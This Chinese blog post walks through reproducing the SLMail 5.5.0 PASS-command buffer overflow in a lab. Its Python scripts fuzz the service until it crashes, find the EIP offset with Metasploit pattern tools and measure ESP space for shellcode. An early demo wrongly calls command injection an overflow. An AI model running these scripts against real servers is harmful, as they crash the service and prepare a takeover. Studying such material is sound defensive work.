<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="王大大">


    <meta name="subtitle" content="成长的路上，请不要忘记善良。">




<title>SLmail溢出漏洞复现 | Welcome</title>



    <link rel="icon" href="/favicon.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
    "HTML-CSS": {
        preferredFont: "TeX",
        availableFonts: ["STIX","TeX"],
        linebreaks: { automatic:true },
        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
    },
    tex2jax: {
        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
        processEscapes: true,
        ignoreClass: "tex2jax_ignore|dno",
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    },
    TeX: {
        equationNumbers: { autoNumber: "AMS" },
        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
        Macros: { href: "{}" }
    },
    messageStyle: "none"
    });
</script>
<!-- 给MathJax元素添加has-jax class -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>
<!-- 通过连接CDN加载MathJax的js代码 -->
<script type="text/javascript" async
        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
</script>


    


<meta name="generator" content="Hexo 5.3.0"></head>
<body>
    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">WangDaDa&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">WangDaDa&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
        <div class="main">
            <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    document.ready(
        function () {
            tocbot.init({
                tocSelector: '.tocbot-list',
                contentSelector: '.post-content',
                headingSelector: 'h1, h2, h3, h4, h5',
                collapseDepth: 1,
                orderedList: false,
                scrollSmooth: true,
            })
        }
    )

    function expand_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 6,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "collapse_toc()");
        b.innerHTML = "Collapse all"
    }

    function collapse_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 1,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "expand_toc()");
        b.innerHTML = "Expand all"
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">SLmail溢出漏洞复现</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">王大大</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">April 15, 2020&nbsp;&nbsp;16:41:19</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/category/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><strong>缓冲区溢出（buffer overflow），是针对程序设计缺陷，向程序输入缓冲区写入使之溢出的内容（通常是超过缓冲区能保存的最大数据量的数据），从而破坏程序运行、趁著中断之际并获取程序乃至系统的控制权。</strong><br><strong>当缓冲区边界限定不严格时，由于变量传入畸形数据或程序运行错误，导致缓冲区被“撑爆”，从而覆盖了相邻内存区域的数据。从而成功修改内存数据，可造成进程劫持，执行恶意代码，获取服务器控制权等后果。</strong></p>
<h2 id="如何发现漏洞"><a href="#如何发现漏洞" class="headerlink" title="如何发现漏洞"></a>如何发现漏洞</h2><ul>
<li>源码审计</li>
<li>逆向工程</li>
<li>模糊测试<ul>
<li>向程序堆栈半随机的数据，根据内存变化判断溢出</li>
<li>数据生成器：生成随机，半随机数据</li>
<li>测试工具：识别溢出漏洞</li>
</ul>
</li>
</ul>
<h2 id="操作系统层级的保护"><a href="#操作系统层级的保护" class="headerlink" title="操作系统层级的保护"></a>操作系统层级的保护</h2><p><strong>当前OpenBSD、Linux、Windows、Mac OS等操作系统都具有buffer overflow protection（缓存溢出保护/存储器位置重新定向）功能[来源请求]，在某种程度上可以保护操作系统，但仍还是有办法让溢出的代码到正确的位置上。其作用原理是：存储器跟进程在memory中受到保护。内对外的access memory对象位置会被核心（调度器）随机定向，使其无法正确溢出。</strong></p>
<h2 id="shell简单溢出演示"><a href="#shell简单溢出演示" class="headerlink" title="shell简单溢出演示"></a>shell简单溢出演示</h2><p><strong>a.sh</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">!#/bin/bash</span><br><span class="line">echo $1</span><br></pre></td></tr></table></figure>
<p><img src="yichu1.png" alt="shell溢出"><br>其脚本本意是输出后面我们输入内容，但是由于符号的引入导致了程序错误，产生溢出，执行了符号后面的命令。</p>
<h2 id="window-server-2003溢出演示"><a href="#window-server-2003溢出演示" class="headerlink" title="window_server_2003溢出演示"></a>window_server_2003溢出演示</h2><p><strong>准备：</strong></p>
<ul>
<li>SLMail 5.5.0 Mail Server</li>
<li>ImmunityDebugger_1_85_setup.exe</li>
<li>mona.py</li>
</ul>
<p>已知SLMail server PASS命令存在溢出漏洞，我们就以此为例来示范漏洞。<br>其中SLMail 服务器的IP为  192.168.0.104<br>物理机的IP 为            192.168.0.103</p>
<h3 id="正常登录"><a href="#正常登录" class="headerlink" title="正常登录"></a>正常登录</h3><p><img src="yichu2.png" alt="yichu2"></p>
<h3 id="脚本登录查看"><a href="#脚本登录查看" class="headerlink" title="脚本登录查看"></a>脚本登录查看</h3><p><strong>01.py</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;\nSending evil buffer&quot;</span></span><br><span class="line">	s.connect((<span class="string">&#x27;192.168.0.104&#x27;</span>,<span class="number">110</span>))</span><br><span class="line">	data = s.recv(<span class="number">1024</span>)</span><br><span class="line">	<span class="built_in">print</span> data</span><br><span class="line"></span><br><span class="line">	s.send(<span class="string">&#x27;USER wangdada&#x27;</span> + <span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">	data = s.recv(<span class="number">1024</span>)</span><br><span class="line">	<span class="built_in">print</span> data</span><br><span class="line"></span><br><span class="line">	s.send(<span class="string">&#x27;PASS test\r\n&#x27;</span>)</span><br><span class="line">	data = s.recv(<span class="number">1024</span>)</span><br><span class="line">	<span class="built_in">print</span> data</span><br><span class="line"></span><br><span class="line">	s.close()</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;\nDone!&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;Could not connect to POP3!&quot;</span></span><br></pre></td></tr></table></figure>
<p><img src="yichu3.png" alt="yichu3"></p>
<h3 id="制造溢出"><a href="#制造溢出" class="headerlink" title="制造溢出"></a>制造溢出</h3><p><strong>使用脚本继续增大PASS命令发送的数据量，判定溢出时需要的数据量的大小，发送之前要在测试机器里面打开调试工具，就是我们准备的那个，运行之后再开始发送数据。</strong><br><strong>02.py</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">buffer = [<span class="string">&#x27;A&#x27;</span>]</span><br><span class="line">counter = <span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(buffer) &lt;= <span class="number">50</span>:</span><br><span class="line">	buffer.append(<span class="string">&quot;A&quot;</span> * counter)</span><br><span class="line">	counter = counter + <span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> string <span class="keyword">in</span> buffer:</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;Fuzzing PASS with %s bytes&quot;</span> % <span class="built_in">len</span>(string)</span><br><span class="line">	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">	connect = s.connect((<span class="string">&quot;192.168.0.104&quot;</span>,<span class="number">110</span>))</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.send(<span class="string">&#x27;USER wangdada&#x27;</span> + <span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.send(<span class="string">&#x27;PASS &#x27;</span>+ string + <span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">	s.send(<span class="string">&#x27;QUIT\r\n&#x27;</span>)</span><br><span class="line">	s.close()</span><br></pre></td></tr></table></figure>
<p><img src="yichu4.png" alt="yichu4"><br><strong>由程序可以看出，当PASS命令发送2900个字符的时候程序停止，已经能判定2900左右个字符的时候发生溢出。</strong><br><strong>再来调试器里面查看，程序已经down了，EIP里面已经填满了16进制为41的数据，ESP里面也全部是我们发送的数据A。</strong><br><code>PS:EIP寄存器存放下一条指令的地址</code><br><img src="asciifull.gif" alt="ascii"><br><img src="yichu5.png" alt="yichu5"><br><img src="yichu6.png" alt="yichu6"><br><strong>由此判断，溢出发生。接下来就是寻找溢出进EIP的具体的四个字符。</strong></p>
<h3 id="找寻导致EIP溢出的字符数"><a href="#找寻导致EIP溢出的字符数" class="headerlink" title="找寻导致EIP溢出的字符数"></a>找寻导致EIP溢出的字符数</h3><p><strong>03.py</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">buffer = <span class="string">&#x27;A&#x27;</span> * <span class="number">2700</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>: </span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;\nSending evil buffer...&quot;</span></span><br><span class="line">	s.connect((<span class="string">&#x27;192.168.0.104&#x27;</span>,<span class="number">110</span>))</span><br><span class="line">	data = s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.send(<span class="string">&#x27;USER wangdada&#x27;</span> + <span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">	data = s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.send(<span class="string">&#x27;PASS &#x27;</span> + buffer + <span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&#x27;\nDone!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;Could not connect to POP3!&quot;</span></span><br></pre></td></tr></table></figure>
<p><img src="yichu7.png" alt="2600"><br><img src="yichu8.png" alt="2700"><br><strong>将服务重启，每次发生溢出后服务都会宕机，然后打开测试软件来监控程序。</strong><br><strong>先发送2600个数据，发生溢出，但是EIP并没有被溢出的数据覆盖，接着发送2700个数据，EIP被覆盖。</strong><br><strong>需要找到的是导致EIP被数据溢出填满的那个数值，2900当然可以，但是2600个虽然导致溢出，但是发现EIP并没有被覆盖，2700个数值可以导致EIP被覆盖。</strong><br><strong>接下来就是找寻能导致EIP被覆盖的数据的具体个数。</strong><br><strong>寻找方法：</strong></p>
<ul>
<li>二分法</li>
<li>唯一字符串法</li>
</ul>
<p><strong>使用唯一字符串，kali里面有现成的脚本，可以自动生成。</strong><br><code>cd /usr/share/metasploit-framework/tools/exploit/</code><br><code>./pattern_create.rb -l 2700</code><br><strong>生成2700个唯一字符串</strong><br><img src="yichu9.png" alt="yichu9"><br><strong>发送唯一字符串</strong><br><strong>04.py</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">buffer = <span class="string">&#x27;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>: </span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;\nSending evil buffer...&quot;</span></span><br><span class="line">	s.connect((<span class="string">&#x27;192.168.0.104&#x27;</span>,<span class="number">110</span>))</span><br><span class="line">	data = s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.send(<span class="string">&#x27;USER wangdada&#x27;</span> + <span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">	data = s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.send(<span class="string">&#x27;PASS &#x27;</span> + buffer + <span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&#x27;\nDone!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;Could not connect to POP3!&quot;</span></span><br></pre></td></tr></table></figure>
<p><strong>查看结果</strong><br><img src="yichu10.png" alt="yichu10"><br><strong>得到EIP溢出的16进制的ascii编码的字符39 69 44 38，而内存的书写方式是与平时相反的，就意味着写入的四个字符的编码为 38 44 69 39。</strong><br><strong>对应上面的ascii表得到四个字符为8Di9,这样就得到了具体溢出的四个字符。</strong><br><strong>使用kali工具计算四个字符在唯一字符串中间的位置。</strong><br><code>./pattern_offset.rb -q 39694438</code><br><code>[*] Exact match at offset 2606</code><br><strong>说明从第2606个位置开始后就是这四个字符，也就得到了EIP溢出的具体位置。</strong></p>
<h3 id="再次确认EIP溢出位置"><a href="#再次确认EIP溢出位置" class="headerlink" title="再次确认EIP溢出位置"></a>再次确认EIP溢出位置</h3><p><strong>既然得到了EIP溢出的数据量，再次来验证确认。</strong><br><strong>05.py</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">buffer = <span class="string">&#x27;A&#x27;</span> * <span class="number">2606</span> +<span class="string">&#x27;B&#x27;</span> * <span class="number">4</span> + <span class="string">&#x27;C&#x27;</span> * <span class="number">20</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>: </span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;\nSending evil buffer...&quot;</span></span><br><span class="line">	s.connect((<span class="string">&#x27;192.168.0.104&#x27;</span>,<span class="number">110</span>))</span><br><span class="line">	data = s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.send(<span class="string">&#x27;USER wangdada&#x27;</span> + <span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">	data = s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.send(<span class="string">&#x27;PASS &#x27;</span> + buffer + <span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&#x27;\nDone!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;Could not connect to POP3!&quot;</span></span><br></pre></td></tr></table></figure>
<p><img src="yichu11.png" alt="yichu11"><br><strong>溢出发生，EIP被填满我们预设好的B字符，ESP则被填满脚本设定的C字符，确认了EIP溢出的具体位置。</strong></p>
<h2 id="确认ESP溢出的数据大小"><a href="#确认ESP溢出的数据大小" class="headerlink" title="确认ESP溢出的数据大小"></a>确认ESP溢出的数据大小</h2><p><strong>以上已经得到了EIP的溢出位数，可以看出ESP也被溢出填满，接下来就判断ESP寄存器可以被溢出的数据大小，如果大小合适，可以来填写我们的shellcode。</strong><br><strong>06.py</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">buffer = <span class="string">&quot;A&quot;</span> * <span class="number">2606</span> + <span class="string">&quot;B&quot;</span> * <span class="number">4</span> + <span class="string">&quot;C&quot;</span> *(<span class="number">3500</span>-<span class="number">2606</span>-<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>: </span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;\nSending evil buffer...&quot;</span></span><br><span class="line">	s.connect((<span class="string">&#x27;192.168.4.104&#x27;</span>,<span class="number">110</span>))</span><br><span class="line">	data = s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.send(<span class="string">&#x27;USER wangdada&#x27;</span> + <span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">	data = s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.send(<span class="string">&#x27;PASS &#x27;</span> + buffer + <span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&#x27;\nDone!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;Could not connect to POP3!&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
